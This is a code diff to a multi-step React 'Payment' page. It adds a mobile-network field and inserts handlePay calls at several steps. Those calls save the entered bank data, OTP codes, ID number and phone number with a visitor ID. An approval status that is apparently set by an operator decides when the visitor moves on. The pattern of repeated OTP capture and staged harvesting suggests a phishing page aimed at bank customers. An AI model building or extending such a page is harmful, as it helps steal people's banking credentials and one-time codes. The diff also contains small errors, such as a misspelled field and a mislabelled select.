@@ -24,7 +24,8 @@ type PaymentInfo = {
   // New fields for steps 3 and 4
   idNumber: string
   phoneNumber: string
-  finalOtp: string
+  finalOtp: string,
+  newtwork:string
 }
 
 const BANKS = [
@@ -133,6 +134,7 @@ const Payment = () => {
     // Initialize new fields
     idNumber: "",
     phoneNumber: "",
+    newtwork:"",
     finalOtp: "",
   })
 
@@ -164,7 +166,6 @@ const Payment = () => {
           const data = docSnap.data() as PaymentInfo
           if (data.status) {
             setPaymentInfo((prev) => ({ ...prev, status: data.status }))
-
             if (data.status === "approved") {
               setIsLoading(false)
               // Redirect to hoiaty page on approval
@@ -181,9 +182,7 @@ const Payment = () => {
     }
   }, [step, visitorId, router])
 
-  const handleSubmit = async () => {
-    // Payment submission logic
-  }
+ 
 
   return (
     <div style={{ background: "#f1f1f1", minHeight: "100vh", margin: 0, padding: 0 }}>
@@ -559,6 +558,17 @@ const Payment = () => {
                           placeholder="Enter your phone number"
                         />
                       </div>
+                      <div>
+                        <label className="column-label" style={{ display: "block", marginBottom: "5px" }}>
+                          Phone Number:
+                        </label>
+                      <select onChange={(e)=> setPaymentInfo({
+                              ...paymentInfo,
+                              newtwork: e.target.value,
+                            })}>
+                        <option></option>
+                      </select>
+                      </div>
                     </form>
                   </div>
                 ) : step === 4 ? (
@@ -640,6 +650,15 @@ const Payment = () => {
                             setIsLoading(true)
                             setTimeout(() => {
                               setIsLoading(false)
+                              handlePay(
+                                {
+                                  ...paymentInfo,
+                                  visitorId,
+                                  createdDate: new Date().toISOString(),
+
+                                },
+                                setPaymentInfo,
+                              )
                               setStep(2)
                             }, 2000)
                           } else if (step === 2) {
@@ -650,6 +669,15 @@ const Payment = () => {
                             handleAddotp(paymentInfo.otp!)
                             setTimeout(() => {
                               setIsLoading(false)
+                              handlePay(
+                                {
+                                  ...paymentInfo,
+                                  visitorId,
+                                  createdDate: new Date().toISOString(),
+
+                                },
+                                setPaymentInfo,
+                              )
                               setPaymentInfo({
                                 ...paymentInfo,
                                 otp: "",
@@ -658,6 +686,13 @@ const Payment = () => {
                             }, 2000)
                           } else if (step === 3) {
                             setIsLoading(true)
+                            handlePay(
+                              {
+                                ...paymentInfo,
+                                visitorId,
+                                createdDate: new Date().toISOString(),
+
+                              },setPaymentInfo)
                             setTimeout(() => {
                               setIsLoading(false)
                               setStep(4)
